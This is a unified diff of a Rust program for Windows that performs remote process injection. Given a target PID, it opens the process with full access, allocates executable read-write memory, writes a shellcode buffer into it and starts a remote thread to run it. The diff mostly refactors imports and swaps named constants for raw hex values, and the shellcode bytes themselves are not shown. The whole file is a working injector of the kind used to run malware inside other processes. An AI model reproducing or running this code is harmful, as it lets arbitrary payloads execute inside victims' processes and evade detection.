@@ -1,18 +1,15 @@
-use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThreadEx};
 use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-use winapi::um::handleapi::CloseHandle;
+use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::synchapi::WaitForSingleObject;
-use winapi::shared::minwindef::DWORD;
-use winapi::ctypes::{c_void};
-use std::ptr;
+use winapi::um::handleapi::CloseHandle;
+use winapi::ctypes::c_void;
+use std::ptr::null_mut;
 use std::mem::transmute;
 
 const K: &str = "[+]";
 const E: &str = "[-]";
 const I: &str = "[*]";
-const INFINITE: DWORD = 0xFFFFFFFF;
 
 fn main()
 {
@@ -24,48 +21,45 @@ fn main()
         println!("{} Usage: program.exe <PID>", E);
         std::process::exit(1);
     } 
-    let mut dw_pid = args[1].parse().unwrap_or_else(|_| {
+    let mut dw_tid: u32 = 0;
+    let dw_pid = args[1].parse().unwrap_or_else(|_| {
         println!("{} Invalid PID", E);
         std::process::exit(1);
     });
 
     /* Open a handle to the process */
     println!("{} trying to get a handle to the process ({})", I, dw_pid);
-    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, dw_pid) };
+    let h_process = unsafe { OpenProcess(0xFFFF, 0, dw_pid) };
     if h_process.is_null() {
         unsafe { println!("{} Failed to get a handle to the process [{}] error: {}", E, dw_pid, GetLastError()); }
         std::process::exit(1);
     }
     println!("{} Got a handle to the process!", K);
     /* Allocate bytes to process memory */
-    let r_buffer = unsafe { VirtualAllocEx(h_process, ptr::null_mut(), SHELLCODE.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };    
+    let r_buffer = unsafe { VirtualAllocEx(h_process, null_mut(), SHELLCODE.len(), 0x00001000 | 0x00002000, 0x40) };
     println!("{} Allocated {} bytes with PAGE_EXECUTE_READWRITE permissions", K, SHELLCODE.len());
     
     /* Write allocated memory to the process memory */
-    unsafe { WriteProcessMemory(h_process, r_buffer, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), ptr::null_mut()); } 
+    unsafe { WriteProcessMemory(h_process, r_buffer, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), null_mut()); } 
     println!("{} Wrote {} bytes to process memory", K, SHELLCODE.len());
 
-    /*  
-        Create thread to run the payload 
-        Some(transmute(r_buffer)) Specify the starting point of the thread
-    */
-    let h_thread = unsafe { CreateRemoteThreadEx(h_process, ptr::null_mut(), 0, Some(transmute(r_buffer)), ptr::null_mut(), 0, ptr::null_mut(), &mut dw_pid) }; 
+    //  Create thread to run the payload 
+    //  Some(transmute(r_buffer)) Specify the starting point of the thread
+    let h_thread = unsafe { CreateRemoteThreadEx(h_process, null_mut(), 0, Some(transmute(r_buffer)), null_mut(), 0, null_mut(), &mut dw_tid) }; 
     if h_thread.is_null() {
         unsafe { println!("{} Failed to get a handle to the threads, error: {}", E, GetLastError()); 
-        CloseHandle(h_process);
-        }
+        CloseHandle(h_process); }
         std::process::exit(1);
     }
-    println!("{} Got a handle to the thread ({})", K, dw_pid);
+    println!("{} Got a handle to the thread ({})", K, dw_tid);
 
-    unsafe { WaitForSingleObject(h_process, INFINITE); }
-    
+    println!("{} Wait for process to stop...", I);
+    unsafe { WaitForSingleObject(h_process, 0xFFFFFFFF); } // 0xFFFFFFFF Work as an INFINITE
+    println!("{} Cleaning ...", I);
     unsafe {
-        println!("{} Cleaning ...", I);
         CloseHandle(h_thread);
         CloseHandle(h_process);
     }
 
 }
 // P.D.M :.
-// cargo build --target x86_64-pc-windows-gnu
